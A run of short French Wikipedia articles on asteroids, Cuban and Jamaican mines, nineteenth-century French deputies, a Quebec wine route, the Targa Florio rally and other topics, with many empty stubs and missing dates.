Elle se marie avec le nageur Charles Hickcox, mais divorce plus tard.

</doc>
<doc id="7279368" url="https://fr.wikipedia.org/wiki?curid=7279368" title="Ingrid Kramer">
Ingrid Kramer



</doc>
<doc id="7279375" url="https://fr.wikipedia.org/wiki?curid=7279375" title="Galina Alekseïeva">
Galina Alekseïeva

Galina Aleksandrovna Alekseïeva (en ), née le à Moscou (république socialiste fédérative soviétique de Russie, URSS) et morte le , est une plongeuse soviétique.
Carrière sportive.
Galina Alekseïeva remporte aux Jeux olympiques d'été de 1964 à Tokyo la médaille de bronze du plongeon individuel à 10 mètres. Quatre ans plus tard, elle se classe aux Jeux olympiques d'été de Mexico.

</doc>
<doc id="7279377" url="https://fr.wikipedia.org/wiki?curid=7279377" title="Combat de Hooglede">
Combat de Hooglede

Le Combat de Hooglede se déroule le pendant la guerre des Paysans. Il s'achève par la victoire des républicains qui mettent en fuite une troupe d'insurgés près de Hooglede.
Déroulement.
Partie d'Ypres, une colonne républicaine de 25 volontaires et 12 hussards du regagne la ville après un affrontement contre les rebelles.

</doc>
<doc id="7279379" url="https://fr.wikipedia.org/wiki?curid=7279379" title="Colonne Sainte Anne">
Colonne Sainte Anne

La colonne Sainte Anne, en allemand Annasäule, est une colonne commémorative de la ville d'Innsbruck, dans le Tyrol, en Autriche. Située sur Maria-Theresien-Straße, dans le centre-ville, elle mesure treize mètres de haut avec à son sommet une statue de la Vierge Marie. Elle a été construite en 1706 pour remercier sainte Anne, figurée par l'une des quatre statues de saints présentes sur son socle, de la libération du Tyrol le . Ce jour-là, jour de la sainte Anne, au terme d'un soulèvement connu en allemand sous le nom de Bayrischer Rummel, la région s'était garantie d'une invasion par l'électorat de Bavière, dans le cadre de la guerre de Succession d'Espagne.

</doc>
<doc id="7279380" url="https://fr.wikipedia.org/wiki?curid=7279380" title="Galina Alekseeva">
Galina Alekseeva



</doc>
<doc id="7279381" url="https://fr.wikipedia.org/wiki?curid=7279381" title="Annasäule">
Annasäule



</doc>
<doc id="7279384" url="https://fr.wikipedia.org/wiki?curid=7279384" title="Cubaniquel">
Cubaniquel

Cubaniquel est une entreprise d'État cubaine chargée de l'exploitation du cobalt et du nickel, dont Cuba est l'un des principaux producteurs mondiaux via notamment les mines de Pinares, de Nicaro et de Moa. Elle travaille en collaboration notamment avec l'entreprise canadienne Sherritt International.
En , douze membres de son équipe dirigeants sont condamnés à des peines de prison de quatre à douze ans pour corruption.

</doc>
<doc id="7279385" url="https://fr.wikipedia.org/wiki?curid=7279385" title="NovaLogic">
NovaLogic

NovaLogic est une entreprise américaine de développement et d'édition de logiciels, plus particulièrement de jeux vidéo. La société, basée à Calabasas, en Californie, est fondée en 1985 par son actuel PDG John A. Garcia.
La société débute en tant que développeur de portages de jeux d'arcades avant de devenir l'éditeur et le développeur de ses propres jeux vidéo. NovaLogic a toujours été possédée par des investisseurs privés, toutefois, Electronic Arts est un actionnaire minoritaire de la société.
Ils sont l'un des premiers studio à utiliser le système du Voxel.
Le , THQ Nordic rachète les séries de Novalogic qui avait fermé un peu plus tôt.
Le , dans le cadre de la Gamescom de Cologne un nouveau Comanche est révélé lors de l'Opening Night Live .

</doc>
<doc id="7279387" url="https://fr.wikipedia.org/wiki?curid=7279387" title="Tour d'Extremadure">
Tour d'Extremadure



</doc>
<doc id="7279389" url="https://fr.wikipedia.org/wiki?curid=7279389" title="Mine de Pinares">
Mine de Pinares

La mine de Pinares est une mine à ciel ouvert de nickel et de cobalt à Cuba.

</doc>
<doc id="7279390" url="https://fr.wikipedia.org/wiki?curid=7279390" title="Mine de Nicaro">
Mine de Nicaro

La mine de Nicaro est une mine à ciel ouvert de nickel et de cobalt à Cuba.

</doc>
<doc id="7279391" url="https://fr.wikipedia.org/wiki?curid=7279391" title="Mine de Moa">
Mine de Moa

La mine de Moa est une mine à ciel ouvert de nickel et de cobalt à Cuba.
Histoire.
À la fin des années 1950, à la veille de la révolution cubaine, l'île est déjà le troisième producteur du monde occidental, avec , derrière le Canada () et la Nouvelle-Calédonie (). L'exploitation y est encore toute récente, opérée une seule société américaine, car les minerais sont des latérites à faible teneur dont le procédé de traitement n'a été mis au point que pendant la Seconde Guerre mondiale. Une partie du minerai est transformée sur place à l'usine de Nicaro, propriété du gouvernement américain, et le reste de la production de minerai exporté aux États-Unis pour être traité près de la Nouvelle-Orléans.
Les États-Unis, qui s'intéressent également aux minerais des Philippines, s'efforcent d'être moins dépendants d'Inco en développant la production cubaine. Afin de la porter à une capacité de en 1959, une seconde usine est achevée dans la baie de Moa. Elle appartient également à une société américaine, qui a une promesse d'achat de tonnes de nickel de la part du gouvernement des États-Unis.
La production de Cuba a diminué en 1990 lors de la chute de l'Union soviétique mais s'est reprise avec l'arrivée du canadien Sherritt International.
Mais une zone grise a persisté autour des exportations cubaines, en raison de l'embargo américain interdisant l'utilisation du métal cubain, qui n'a pris fin qu'en 2014.

</doc>
<doc id="7279393" url="https://fr.wikipedia.org/wiki?curid=7279393" title="Alpart">
Alpart

Alpart, à l'origine Alumina Partners of Jamaica, est un complexe de minage de bauxite et de transformation en aluminium situé en Jamaïque. Le complexe a employé environ personnes au cours de son histoire, pour une production de 1,65 million de tonnes d'aluminium.
Histoire.
Le complexe a ouvert en 1969. De 2008 à 2017, le complexe d'Alpart a été fermé.
Elle appartenait à Rusal entre 2011 et 2017 date de son rachat par Jisco/Jiquan Iron and Steel, une entreprise chinoise, pour 300 millions de dollars. À la suite de l'acquisition par Jisco, ce dernier annonce un plan pour la construction d'une autre raffinerie d'une capacité de 2 millions de tonnes situé près de la première.

</doc>
<doc id="7279394" url="https://fr.wikipedia.org/wiki?curid=7279394" title="Windalco">
Windalco

Windalco est un complexe de minage de bauxite et de transformation en aluminium, situé en Jamaïque. Il comprend deux raffineries d'aluminium à Ewarton et à Kirkvine, ainsi que deux mines à Kirkvine et à Ewarton. Windalco appartient à Rusal à 93 %. Le complexe appartenait auparavant à Alcan. Il a fermé durant l'année 2009 à la suite de la crise économique, alors que la raffinerie de Kirkvine est resté fermée depuis. Windalco a eu une production de 1,2 million tonnes d'aluminium en 2010.

</doc>
<doc id="7279396" url="https://fr.wikipedia.org/wiki?curid=7279396" title="Ashley Purdy">
Ashley Purdy



</doc>
<doc id="7279397" url="https://fr.wikipedia.org/wiki?curid=7279397" title="Louis Pommeraye">
Louis Pommeraye



</doc>
<doc id="7279398" url="https://fr.wikipedia.org/wiki?curid=7279398" title="Opmm">
Opmm



</doc>
<doc id="7279400" url="https://fr.wikipedia.org/wiki?curid=7279400" title="Chiquititas (telenovela, 2013)">
Chiquititas (telenovela, 2013)

Chiquititas est une telenovela brésilienne diffusé du au sur SBT.
Bande-originale.
Liste des pistes
Les chansons qui sont astérisque (*) n'ont jamais été vus dans les versions précédentes de "Chiquititas", sont sans précédent dans cette version.

</doc>
<doc id="7279403" url="https://fr.wikipedia.org/wiki?curid=7279403" title="Jeffrey King">
Jeffrey King

Jeffrey King est un personnage du soap opera "On ne vit qu'une fois", diffusé sur la chaîne de télévision américaine ABC. Il est interprété par Corbin Bleu, et a fait sa première apparition le . 
Histoire.
Jeffrey apparaît d'abord comme journaliste pigiste pour La bannière dans l'espoir d'obtenir un poste de la part de Viki Seigneur (Erika Slezak) à la suite de son article sur un scandal du sénateur junior, Dorian Lord (Robin Strasser). Jeffrey partage aussi un passé avec Matthew Buchanan (Robert Gorrie) et Danielle Manning (Kelley Missel) quand ils étaient en pensionnat à Londres. Soucieux d'aider à lancer le journal à défaut de Viki, Jeffrey la convainc d'imprimer un autre article qui incrimine davantage Dorian. Pendant ce temps, Matthew et Jeffrey se déplacent dans leur propre appartement seul. 
Jeffrey perd la chambre supplémentaire que son bureau quand Dani passe brutalement po Lorsque Viki révèle que le budget est trop serré pour Jeffrey pour devenir un membre du personnel permanent, il décide de continuer le travail indépendant donnant le premier refus de la bannière à ses futurs articles. Jeffrey s'intéresse à Destin Evans (Laura Harrier), la mère de l'enfant de Matthew, au grand dam de Matthew. Pendant ce temps, Jeffrey rapporte les nouvelles à Viki qu'un de ses investissements va peut-être lui coûter tout. Plus tard, les forces Jeffrey Matthew font face à la fille avec laquelle il a bavardé sur Internet après qu'elle lui résiste. Cependant, Jeffrey est très fatigué de Michelle (Amber Skye Noyes).
Création.
En , l'écrivain, en tête Thom Racina a posté des photos sur Facebook de lui-même et la co-scénariste en chef Susie Bedsow Horgan brainstorming avec plus d'une liste des noms de personnages. Le personnage nouvellement créé de Jeffrey était au bas de la liste. Un personnage tout nouveau qui vient d'être classé parmi les personnages habituels de la vie conduit à la spéculation que le nom de code était un personnage déjà établie. Plusieurs autres personnages sont apparus dans les scripts d'auditions, y compris "Sam" et "Mick Wilder" ce qui a conduit à la spéculation que les trois étaient de la même nature.
Le , Prospect Park a envoyé un communiqué de presse annonçant que l'ex-star de Disney Corbin Bleu, connu pour son rôle de soutien de Chad Danforth dans la franchise musicale de Disney, High School Musical avait été choisi pour le rôle de Jeffrey roi. Bleu a posté plus tard à Facebook pour exprimer son enthousiasme de rejoindre le casting de la série One life to live. Bleu a dit à Us Weekly que les producteurs l'ont appelé et lui ont offert le rôle. 
L'acteur a révélé dans une interview avec Soap opera Digest que le producteur exécutif, Jennifer Pepperman lui a tendu la main personnellement. Bleu a fait sa première apparition dans la série Premier ministre le .

</doc>
<doc id="7279406" url="https://fr.wikipedia.org/wiki?curid=7279406" title="Route des vins de la Montérégie">
Route des vins de la Montérégie

La route des vins de la Montérégie est une route touristique de la région de la Montérégie au Québec, créée en 2011. Cette région correspond à la ceinture sud de l'île de Montréal, qui se rend de Varennes au nord, jusqu'à la frontière des États-Unis au sud, et s'étend de Rigaud à l'ouest, jusqu'à St-Hyacinthe à l'est. La distance totale du circuit est d'environ 150 km, et 21 vignobles en sont membres. Ce circuit a été créé en complément d'autres circuits existants pour promouvoir plusieurs aspects du tourisme en Montérégie, tels que le cyclotourisme et le tourisme historique.
La viticulture au Québec.
Le Québec n'est pas une région propice à la culture des raisins utilisés pour la fabrication du vin, particulièrement à cause de son climat rigoureux en hiver, même dans les endroits les plus au sud comme la Montérégie et les Cantons-de-l'Est. Les cépages dits « classiques » sont donc peu utilisés pour la production de vin. Les producteurs doivent avoir recours aux cépages dits « hybrides », qui permettent la culture de vignes résistantes à des froids intenses. D'ailleurs, tant au Québec en général que dans la région de la Montérégie, les cépages les plus exploités sont tous des hybrides, entre autres le Frontenac, le Maréchal Foch ou le Vidal blanc.
La viticulture en Montérégie.
La Montérégie est l'une des deux régions productrices de vin les plus importantes au Québec, avec les Cantons-de-l'Est, du fait que la température y est moins rigoureuse que dans d'autres régions. Le nombre total de vignobles ouverts au publics dans cette région est en hausse, si l'on se fie au nombre de membres de la route des vins de la Montérégie, qui est passé de 16 à 21 entre 2011 et 2013. Malgré cette augmentation du nombre de vignobles, la superficie totale des terres consacrées à la culture vinicole en Montérégie (82,8 acres) est toujours inférieure à celle des Cantons-de-l'est (102,7 acres) , ce qui pourrait expliquer pourquoi la plupart des vignobles de la Montérégie ne sont pas les plus connus au Québec. Plusieurs d'entre eux sont également ouverts au public depuis peu, comme le vignoble Vertefeuille, ouvert au public à partir de l'été 2013 et le Domaine la Branche ouvert au public à l'automne 2013. 
Les vignobles.
Vignoble la Romance du Vin (Rigaud).
Existe depuis 1999 et offre des produits au public depuis 2008. Production de vins blancs, rouges et rosés, de vins de glace et de vins de vendanges tardives.
Vignoble Côte de Vaudreuil (Vaudreuil-Dorion).
Production de vins blancs, rouges et rosés, de vins mousseux et de vins fortifiés. 
Vignoble J.O. Montpetit et fils (St-Étienne-de-Beauharnois).
Créé en 1999. Production de vins rouges, rosés et blancs, et de vins de glace. Vignoble le plus important en Montérégie et septième vignoble le plus important au Québec sur le plan de la superficie.
Vignoble le Marathonien (Havelock).
Existe depuis 1990. Production de vins rouges, blancs et rosés, mais particulièrement de vins de vendanges tardives et de vins de glace.
Domaine des Salamandres (Hemmingford).
Produit seulement des vins de glace. Production d'alcools de fruits provenant des vergers.
Vignoble le Chat de Botté (Hemmingford).
Spécialisation dans les vins de paille. Vins rouges, vins blancs, vins rosés et vins rouges fortifiés.
Vignoble le Morou (St-Cyprien-de-Napierville).
Vignoble créé en 1987. Vins rouges, vins blanc, vins rosés et vins de glace.
Vignoble le Mas de Patriotes (St-Jean-sur-Richelieu).
Production de vins blancs, rouges et rosés.
Vignoble du Domaine St-Jacques (St-Jacques-le-Mineur).
Vins blancs, rouges, rosés et vins de glace rouges et blancs.
Domaine La Branche (St-Isidore).
Ouverture du vignoble à venir à l'automne 2013.
Vignoble Vertefeuille (La Prairie).
Ouvert au public depuis l'été 2013. Vins blancs, rouges, rosés.
Vignoble Vertefeuille (St-Bruno-de-Montarville).
Ouvert au public en 2007. Vins blancs, rosés, rouges, vins fortifiés et vins de glace.
Domaine du Fleuve (Varennes).
Vins rouges, blancs, rosés et fortifiés.
Domaine Elbama (St-Amable).
existe depuis 2009 Vins rouges, blancs, rosés. mistelle ouveret a l'année du vendredi au dimanche (450)649-0710
Vignoble Clos-Mont-St-Hilaire (Mont-St-Hilaire).
Existe depuis 1999. Vins blancs, rouges, rosés et vins fortifiés. 

</doc>
<doc id="7279407" url="https://fr.wikipedia.org/wiki?curid=7279407" title="Fusanosuke Natsume">
Fusanosuke Natsume

, né le , est un mangaka et critique de bandes dessinées japonais. Né à Tokyo, petit-fils du romancier Natsume Sōseki, il fréquente l'université Aoyama Gakuin dont il est diplômé en 1973. Il est actuellement professeur à l'université Gakushûin Graduate school of Humanity Corporeal and Visual Representation, et donne également des cours sur le manga dans d'autres établissements universitaires. 
Critique de manga.
Il est considéré aujourd'hui au Japon comme un des critiques les plus importants de manga. Il a commencé sa carrière de critique de bande dessinée japonaise en tant que pigiste. Comme il est dessinateur, il a trouvé une nouvelle approche de la critique de manga, en accompagnant ses textes de dessins manga. Jusqu'alors le discours sur le manga ne s'interessait qu'au récit, à la structure du récit ou au côté idéologique de l'œuvre, dérivé de la recherche littéraire, Natsume a apporté une nouvelle manière d'analyser le manga, en recopiant des traits de dessin d'Osamu Tezuka. Son travail peut être assimilé à celui de Scott McCloud, mais Natsume n'a pas l'intention de situer le manga dans l'histoire d'art en général comme le dessinateur américain. Le nom de Natsume en tant que critique de manga devient célèbre avec (publié en 1992) .

</doc>
<doc id="7279409" url="https://fr.wikipedia.org/wiki?curid=7279409" title="(1878) Hughes">
(1878) Hughes

(1878) Hughes est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1933 QC.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279410" url="https://fr.wikipedia.org/wiki?curid=7279410" title="(2276) Warck">
(2276) Warck

(2276) Warck est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire était 1933 QA.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279411" url="https://fr.wikipedia.org/wiki?curid=7279411" title="(2331) Parvulesco">
(2331) Parvulesco

(2331) Parvulesco est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte. Il est dédié à l'astronome roumain (1890-1945).
Historique.
Sa désignation provisoire était 1936 EA.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279414" url="https://fr.wikipedia.org/wiki?curid=7279414" title="(2534) Houzeau">
(2534) Houzeau

(2534) Houzeau est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1931 VD.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279415" url="https://fr.wikipedia.org/wiki?curid=7279415" title="Treizième circonscription de la Seine-Saint-Denis de 1988 à 2012">
Treizième circonscription de la Seine-Saint-Denis de 1988 à 2012



</doc>
<doc id="7279431" url="https://fr.wikipedia.org/wiki?curid=7279431" title="(2545) Verbiest">
(2545) Verbiest

(2545) Verbiest est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1933 BB.
L’astéroïde porte le nom du missionnaire et astronome belge Ferdinand Verbiest.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279447" url="https://fr.wikipedia.org/wiki?curid=7279447" title="(2713) Luxembourg">
(2713) Luxembourg

(2713) Luxembourg est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1938 EA.

</doc>
<doc id="7279451" url="https://fr.wikipedia.org/wiki?curid=7279451" title="(3567) Alvema">
(3567) Alvema

(3567) Alvema est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire, lors de sa découverte était 1930 VD.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279452" url="https://fr.wikipedia.org/wiki?curid=7279452" title="(3605) Davy">
(3605) Davy

(3605) Davy est un astéroïde de la ceinture principale découvert le à Uccle par l'astronome belge Eugène Joseph Delporte.
Historique.
Sa désignation provisoire, lors de sa découverte le , était 1932 WB.
Nommé en l'honneur de Davy De Winter, fils de l'administratrice de l'Observatoire royal de Belgique, Mme Asselberghs. (M 14029). Nom proposé par G. Roland.

</doc>
<doc id="7279453" url="https://fr.wikipedia.org/wiki?curid=7279453" title="(6354) Vangelis">
(6354) Vangelis

(6354) Vangelis est un astéroïde de la ceinture principale découvert le par l'astronome belge Eugène Joseph Delporte.
Historique.
Le lieu de découverte, par l'astronome belge Eugène Joseph Delporte, est Schaerbeek.
Sa désignation provisoire, lors de sa découverte le , était 1934 GA.
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de 
Il a été définitivement nommé en l'honneur du musicien et compositeur grec Vangelis en 2003.

</doc>
<doc id="7279454" url="https://fr.wikipedia.org/wiki?curid=7279454" title="(7043) Godart">
(7043) Godart

(7043) Godart est un astéroïde de la ceinture principale découvert le par l'astronome belge Eugène Joseph Delporte.
Historique.
Le lieu de découverte, par l'astronome belge Eugène Joseph Delporte, est Uccle.
L’astéroïde a été nommé le 28 août 1996 d’après l’astronome belge Odon Godart (1913-1996).
Caractéristiques.
Sa distance minimale d'intersection de l'orbite terrestre est de .

</doc>
<doc id="7279456" url="https://fr.wikipedia.org/wiki?curid=7279456" title="Octobre 1955">
Octobre 1955



</doc>
<doc id="7279462" url="https://fr.wikipedia.org/wiki?curid=7279462" title="Tsai Yulong">
Tsai Yulong



</doc>
<doc id="7279464" url="https://fr.wikipedia.org/wiki?curid=7279464" title="Septembre 1955">
Septembre 1955



</doc>
<doc id="7279467" url="https://fr.wikipedia.org/wiki?curid=7279467" title="Maison de saint Pierre">
Maison de saint Pierre



</doc>
<doc id="7279468" url="https://fr.wikipedia.org/wiki?curid=7279468" title="Août 1955">
Août 1955



</doc>
<doc id="7279473" url="https://fr.wikipedia.org/wiki?curid=7279473" title="Cinnamomum glanduliferum">
Cinnamomum glanduliferum

Cinnamomum glanduliferum, qui porte le nom vernaculaire de Camphrier du Népal, est une espèce de plantes à fleurs du genre "Cinnamomum" et de la famille des "Lauraceae". C'est un arbre originaire d'Asie.
Description.
"Cinnamomum glanduliferum" est un arbre à feuillage persistant qui atteint une hauteur d'environ 5 à 20 mètres. Ses feuilles sont brillantes, vert foncé, alternes, pétiolées, de forme elliptique, ovée ou lancéolée et mesurent de 6 à 15 cm de long et de 4 à 6,5 cm de large. Les fleurs sont jaunâtres et petites et mesurent environ 3 mm de large. Les fruits noirs globuleux mesurent jusqu'à 1 cm de diamètre. La période de floraison va de mars à mai, et les fruits mûrissent de juillet à septembre. Les feuilles ont une odeur caractéristique et contiennent du camphre et des huiles volatiles.
Distribution.
Cette plante est indigène en Chine, au Bhoutan, en Inde, en Malaisie, au Myanmar et au Népal.
Habitat.
En Chine, "Cinnamomum glanduliferum" croît dans les forêts décidues des régions montagneuses à une altitude d'environ à , et parfois à une altitude plus élevée.

</doc>
<doc id="7279475" url="https://fr.wikipedia.org/wiki?curid=7279475" title="Juillet 1955">
Juillet 1955

Cette page présente les faits marquants du mois de .

</doc>
<doc id="7279478" url="https://fr.wikipedia.org/wiki?curid=7279478" title="Juin 1955">
Juin 1955



</doc>
<doc id="7279481" url="https://fr.wikipedia.org/wiki?curid=7279481" title="Mai 1955">
Mai 1955



</doc>
<doc id="7279488" url="https://fr.wikipedia.org/wiki?curid=7279488" title="Avril 1955">
Avril 1955



</doc>
<doc id="7279492" url="https://fr.wikipedia.org/wiki?curid=7279492" title="Mars 1955">
Mars 1955



</doc>
<doc id="7279496" url="https://fr.wikipedia.org/wiki?curid=7279496" title="Février 1955">
Février 1955



</doc>
<doc id="7279502" url="https://fr.wikipedia.org/wiki?curid=7279502" title="Janvier 1955">
Janvier 1955

Cette page présente les faits marquants du mois de .

</doc>
<doc id="7279509" url="https://fr.wikipedia.org/wiki?curid=7279509" title="Al-Arabi SC (Qatar)">
Al-Arabi SC (Qatar)



</doc>
<doc id="7279510" url="https://fr.wikipedia.org/wiki?curid=7279510" title="USS Wyoming">
USS Wyoming

USS "Wyoming" est le nom de plusieurs bateaux américains, nommé pour l'un d'entre eux en hommage à la dans l'est de la Pennsylvanie le long de la Susquehanna. Les trois autres ont été nommés en hommage à l'état du Wyoming.
Voir aussi :

</doc>
<doc id="7279511" url="https://fr.wikipedia.org/wiki?curid=7279511" title="Gherardo">
Gherardo



</doc>
<doc id="7279523" url="https://fr.wikipedia.org/wiki?curid=7279523" title="Rallye des 1000 milles">
Rallye des 1000 milles



</doc>
<doc id="7279527" url="https://fr.wikipedia.org/wiki?curid=7279527" title="Melchior Febvrel">
Melchior Febvrel

Melchior Alcide Febvrel est un homme politique français né le à Saint-Dié (Vosges) et mort le à Jarménil (Vosges).
Propriétaire agriculteur et notaire, il est député des Vosges de 1849 à 1851, il siège à droite et soutient le prince-président.

</doc>
<doc id="7279529" url="https://fr.wikipedia.org/wiki?curid=7279529" title="Pierre Guilgot">
Pierre Guilgot

Pierre Charles Guilgot est un homme politique français né le à Épinal (Vosges) et décédé le à Épinal.
Biographie.
Rentier, il est député des Vosges de 1850 à 1851, siégeant à gauche. Il proteste contre le coup d’État du 2 décembre 1851 et quitte la vie politique.

</doc>
<doc id="7279533" url="https://fr.wikipedia.org/wiki?curid=7279533" title="Jacques Cordier (homme politique)">
Jacques Cordier (homme politique)

Jacques Louis Adolphe Cordier est un homme politique français né le à Lisieux (Calvados) et mort le à Neuilly-sur-Seine.
Docteur en droit, il est sous-préfet de Pont-l’Évêque sous la monarchie de Juillet. Il est député du Calvados de 1849 à 1851, siégeant à droite, avec les orléanistes.
Propriétaire à Trouville-sur-Mer du chalet Cordier, résidence du président de la république Adolphe Thiers en 1872.

</doc>
<doc id="7279536" url="https://fr.wikipedia.org/wiki?curid=7279536" title="Eriek Verpale">
Eriek Verpale

Eriek Verpale (Eric Verpaele pour l'état civil) est un écrivain belge d'expression néerlandaise né à Zelzate le et décédé à Ertvelde le .

</doc>
<doc id="7279537" url="https://fr.wikipedia.org/wiki?curid=7279537" title="Alfred Rioult de Neuville">
Alfred Rioult de Neuville

Alfred Léon Rioult de Neuville, est un homme politique français né le à Livarot (Calvados) et mort le à Livarot.
Biographie.
Alfred Rioult de Neuville est le fils de Louis-Philippe-Auguste Rioult de Neuville et de Marie Cécile Rondel d'Heudreville. 
Gentilhomme de la Chambre du roi, il épouse le 7 avril 1824 Louise Augustine de Villèle, fille du président du Conseil Joseph de Villèle. Le roi Louis XVIII signera le contrat de mariage. Il est le père de l'historien Louis Rioult de Neuville (1832-1916).
Propriétaire du château de Neuville à Livarot, il est maire de la commune et conseiller général pour le canton de Livarot de 1848 à 1852. D'opinions monarchistes, il est élu représentant du Calvados à l'Assemblée législative, le 13 mai 1849. Il siège à droite et opine avec la majorité monarchiste pour l'expédition de Rome, pour la loi Falloux-Parieu sur l'enseignement, pour la loi restrictive du suffrage universel. Il ne se rallie pas à la politique de Louis-Napoléon Bonaparte et rentre dans la vie privée à la suite du coup d'État du 2 décembre 1851 instaurant le Second Empire.
Aux élections du 8 février 1871 pour l'Assemblée nationale, Alfred Rioult de Neuville, est de nouveau candidat conservateur monarchiste dans le Calvados, réunissant, sans être élu, sur .

</doc>
<doc id="7279547" url="https://fr.wikipedia.org/wiki?curid=7279547" title="Antoine-Félix de Leyris d'Esponchez">
Antoine-Félix de Leyris d'Esponchez

Antoine-Félix de Leyris d'Esponchez, né à Alais (Alès) le et mort près d'Udine le , est un prélat et homme politique français qui fut le dernier évêque d'Elne et député du clergé aux États généraux de 1789.
Biographie.
Antoine-Félix de Leyris d'Esponchez est le fils de Guillaume de Leyris, seigneur d'Esponchez et de Blanche de Thomas La Garde. Licencié en théologie, chanoine de Nîmes il est pourvu en commende de l'abbaye de Lesterps dans le diocèse de Limoges. il est chapelain des obits de l'église royale et collégiale Saint-Frambourg de Senlis puis vicaire général du diocèse de Senlis.
Le , il est sélectionné pour succéder à Jean-Gabriel d'Agay, évêque d'Elne mort le . Confirmé le , il résigne son abbaye et il est consacré le 4 janvier suivant et prend possession de son diocèse le au moment des élections aux États généraux de 1789.
Le , il est élu député du clergé aux États généraux par la viguerie de Perpignan. Au sein de la Constituante, il s'oppose à la suppression des dîmes et des autres privilèges de son ordre et ensuite aux mesures prises par l'Assemblée constituante en matière religieuse notamment à la constitution civile du clergé et refuse de prêtre le serment. Des troubles ayant éclaté à Perpignan, la municipalité de la ville l'accuse d'en être le fauteur. Il est arrêté et traduit devant le tribunal d'Orléans. L'installation d'un évêque constitutionnel en la personne de Gabriel Deville l'oblige à émigrer d'abord à Rome puis à Ancône et Venise en 1795 et enfin à Görlitz en 1797. De là il tente d'administrer son diocèse par le biais de ses vicaires généraux eux aussi émigrés en Espagne contre le nouvel évêque constitutionnel Dominique-Paul Villa. Il meurt le à Campo Longo près d'Udine avant que le pape Pie VII ne lui demande de renoncer à son siège épiscopal à la suite de la signature du Concordat de 1801.

</doc>
<doc id="7279559" url="https://fr.wikipedia.org/wiki?curid=7279559" title="Bactoprénol">
Bactoprénol

Le bactoprénol est un polyterpénoïde de formule brute produit notamment par les lactobacilles par la voie du mévalonate. Les composés apparentés en et forment avec lui la famille des "bactoprénols".
Dans les cellules bactériennes, les bactoprénols sont phosphorylés sur leur hydroxyle côté cytoplasmique et permettent le transport transmembranaire de l'acide (NAM) et de la (NAG) lors de la biosynthèse du peptidoglycane : ces derniers se fixent sur le phosphate à l'intérieur de la cellule et la molécule se retourne dans la bicouche lipidique afin de transporter NAM et NAG vers l'extérieur de la cellule où est assemblé le peptidoglycane. Le phosphate est alors hydrolysé et la molécule de bactoprénol se retourne à nouveau dans la membrane pour un nouveau transport.
La bacitracine, un mélange d'oligopeptides apparentés sécrété par les organismes du groupe de "Bacillus subtilis", bloquent la déphosphorylation des bactoprénols du côté extérieur de la bactérie, ce qui empêche la formation du peptidoglycane de la paroi bactérienne en bloquant la navette des molécules de bactoprénol.

</doc>
<doc id="7279560" url="https://fr.wikipedia.org/wiki?curid=7279560" title="Stan Tracey">
Stan Tracey

Stanley William « Stan » Tracey, né le à Denmark Hill, South London (Angleterre) et mort le , est un pianiste et compositeur de jazz britannique.

</doc>
<doc id="7279592" url="https://fr.wikipedia.org/wiki?curid=7279592" title="Carte de surface">
Carte de surface



</doc>
<doc id="7279598" url="https://fr.wikipedia.org/wiki?curid=7279598" title="Loreto Convent School">
Loreto Convent School

Loreto Convent School est une école catholique indépendante foundée en 1878. Sa devise est « Learning and Leading in Love and Justice ». Elle est située à Pretoria, en Afrique du Sud.
Personnalités, anciens élèves.
Cette école a eu, parmi ses élèves, la célèbre botaniste sud-africaine Inez Clare Verdoorn, en 1916.

</doc>
<doc id="7279611" url="https://fr.wikipedia.org/wiki?curid=7279611" title="Rallye Targa Florio">
Rallye Targa Florio

Le Rallye Targa Florio (ou Targa Florio-Rally Internazionale Di Sicilia) est un rallye italien de Sicile qui se dispute annuellement sur asphalte et sur secteurs pavés, autour de Palerme et dans les Madonies. Il est organisé tous les ans au mois de mai par "l'Automobile Club de Palerme" (en collaboration avec la région de Sicile, la province et la commune de Palerme, la commune de Cefalù, la ville de Termini Imerese, etc.).
Histoire.
Il apparait dès 1978, en remplacement de la célèbre Targa Florio (mais en gardant toujours la même chronologie), ancienne épreuve se déroulant sur le circuit des Madonies et utilisant les routes de Sicile, dont l'ultime le voit la mort de deux spectateurs, ainsi que de graves blessures pour trois autres personnes dont le pilote Gabriele Ciuti à la suite de sa sortie de route sur Osella-BMW.
Il est intégré au championnat d'Italie depuis ses débuts, et au Championnat d'Europe des rallyes sans discontinuer de 1984 à 2011. L'Intercontinental Rally Challenge l'a pour manche en 2012 en remplacement du Rallye Mecksek, pour des raisons économiques (en 2011, il a été proposé comme une alternative au Rallye de Sardaigne pour le Championnat du monde des rallyes, mais finalement ce dernier a encore été retenu). Il a été suspendu en 2012, à la suite de la mort de Gareth Roberts, copilote de Craig Breen (accident de leur Peugeot 207).
Paolo Andreucci l'a remporté six fois (1997, 2003, 2004, 2006, 2007, et 2011).
Il existe aussi une compétition « Historic » du rallye, et une version « écologique » depuis 2007, le "Green Prix-Targa Florio".
2016 sera l'année du centenaire.

</doc>
<doc id="7279612" url="https://fr.wikipedia.org/wiki?curid=7279612" title="Records d'Europe juniors d'athlétisme">
Records d'Europe juniors d'athlétisme

